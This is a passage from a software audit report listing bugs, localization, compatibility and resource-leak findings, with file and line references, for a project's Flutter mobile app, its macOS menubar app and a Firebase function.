  _ImageGenerationResultCard(:281-359)、GeneratedImageChatGroup 锚点渲染（chat_message_list.dart:1091-1092,598-601）、展开态内嵌 ImagePreviewWidget(:526-532) 三条路径都不显示时间。应统一由承载它们的 group/bubble 头行提供。
- `U-5` **[bug]** `apps/mobile/lib/widgets/user_bubble.dart:445` — 用户长文本与 timestamp 同处一个 Row，多行消息每一行都被压窄约 60px
  Flexible 文本 + 固定 timestamp 列的布局使 timestamp 的宽度影响整段而非只影响最后一行，长消息可读宽度被永久压缩。应改末行内联（Wrap/WidgetSpan）或叠加定位。
- `D7` **[compat]** `apps/mobile/pubspec.yaml:35` — intl: any has no version constraint
  Only pubspec.lock and flutter_localizations' transitive constraint pin the version; declare an explicit ^0.20.x matching the lock.

### menubar

- `C19` **[compat]** `apps/menubar/CCPocketMenubar.xcodeproj/project.pbxproj` — Generated pbxproj and XcodeGen project.yml both committed; will drift
  The Xcode project file and its XcodeGen source of truth are both checked in, so manual Xcode edits and project.yml will silently diverge.
- **[compat]** `apps/menubar/CCPocketMenubar.xcodeproj/project.pbxproj` — Generated project.pbxproj committed alongside XcodeGen project.yml (drift risk)
  Both the XcodeGen source (project.yml) and the generated .xcodeproj are in the repo while .gitignore only covers build/DerivedData, so the two will drift and produce inconsistent builds. Ignore *.xcodeproj and keep project.yml as the single source of truth.
- **[l10n]** `apps/menubar/CCPocketMenubar/Localizable.xcstrings` — ~15 zombie xcstrings keys with no remaining code references
  Keys like 'Welcome to CC Pocket', 'Get Started', 'Continue Anyway', 'Environment Check', 'Copy All', 'You're All Set!' etc. are no longer referenced in code (redesign leftovers) and should be pruned to keep the catalog and future translations accurate.
- `C19` **[leak]** `apps/menubar/CCPocketMenubar/Services/BridgeClient.swift:34` — doctor() creates a new URLSession per call and never invalidates it
  Each Doctor refresh constructs a fresh URLSession that is never invalidateAndCancel()'d; URLSession retains itself until invalidated, leaking a session plus its delegate queue per call. Promote to a stored property.
- **[logic]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:55` — Six dead methods with zero call sites (isServiceRegistered, uninstallBridge, etc.)
  BridgeProcessManager.isServiceRegistered() (:55), DoctorViewModel.uninstallBridge() (:173), allSetupCommands(for:) (:285), openSetupTerminal(for:) (:226), and both copySetupCommands variants (:233,:252) have no callers. Leftover from a redesign; should be deleted to avoid divergence.
- **[bug]** `apps/menubar/CCPocketMenubar/Services/DoctorRunner.swift:17` — try? swallows errors at 5 sites; HTTP doctor failure silently degrades to 60s CLI
  try? at DoctorRunner.swift:17, AppViewModel.swift:102,117, DoctorViewModel.swift:387, BridgeProcessManager.swift:179 discard failures. DoctorRunner.swift:17 notably degrades any HTTP doctor failure (including decode errors/500s that should surface) into the 60-second CLI path with no user-visible explanation for the slowdown.
- `C19` **[logic]** `apps/menubar/CCPocketMenubar/Services/NetworkDiscovery.swift:7` — Interface enumeration lists unreachable NICs; Tailscale check uses bare 100. prefix
  getifaddrs enumerates all IPv4 interfaces filtering only 127.*, so Docker bridges (172.17.x), link-local 169.254.x, and other VPN utuns are offered as LAN/Tailscale addresses the phone cannot reach. The `ip.hasPrefix("100.")` Tailscale classification is wrong for the 100.64.0.0/10 CGNAT range. Local-display only, so low risk.
- **[bug]** `apps/menubar/CCPocketMenubar/ViewModels/AppViewModel.swift:106` — print() logs error objects that may contain shell output with paths/credentials
  AppViewModel.swift:106,149 print raw error objects; these can be ProcessError values carrying merged shell stdout/stderr including home paths and token fragments. Switch to os.Logger with privacy: .private on sensitive fields.
- `C19` **[bug]** `apps/menubar/CCPocketMenubar/ViewModels/DoctorViewModel.swift:379` — performAction has no in-flight guard; double-tap runs two concurrent npm installs
  All Task{} usages (AppViewModel.swift:93,112,129; DoctorViewModel.swift:101,383; UsageViewModel.swift:17) are unstructured and never cancelled; fetchUsage/runDoctor have loading guards but performAction does not. Tapping 'Install Codex' twice runs two concurrent `npm install -g`, actionInProgress values overwrite each other, and each occupies a blocked cooperative thread.
- `C19` **[l10n]** `apps/menubar/CCPocketMenubar/ViewModels/QRCodeViewModel.swift:28` — Address auto-selection compares against localized label string 'LAN'
  addresses.first(where: { $0.label == "LAN" }) matches a String(localized:) value from NetworkDiscovery.swift:45,47. Any locale translating 'LAN' breaks auto-selection silently, falling back to addresses.first which may be a Docker NIC. Add an enum Kind { lan, tailscale } and keep label display-only.
- **[bug]** `apps/menubar/CCPocketMenubar/Views/DoctorPage/DoctorPageView.swift:177` — Dead UI: failed 'Bridge Server' required check row offers no action button
  actionFor returns nil for 'Bridge Server' with status fail (only 'launchd service'+skip gets an action), so when the Bridge is not installed the required-item row has no actionable button at all, leaving the user without an in-app remediation path.
- `C19` **[l10n]** `apps/menubar/CCPocketMenubar/Views/UsagePage/UsagePageView.swift:108` — 9 hardcoded non-localized user-visible strings across 4 files
  '5-hour'/'7-day' gauge labels go through Text(label) verbatim (not in xcstrings), UsageInfo.swift hardcodes '—', 'now', and English '\(hours)h \(minutes)m' time formats, DoctorRunner.swift:71's LocalizedError text and BridgeProcessManager.swift:216's raw shell tail reach the UI unlocalized. CheckResultRow/UsagePage also render Bridge-supplied English verbatim, needing a mapping table or Bridge-side change.

### Other

- `C-5` **[bug]** `functions/src/index.ts:513` — onRequest({ cors: true }) open to any Origin
  The endpoint requires a Bearer token so it is not CSRF-able, but wildcard CORS widens the browser-side abuse surface; the report recommends narrowing to an allowlist.
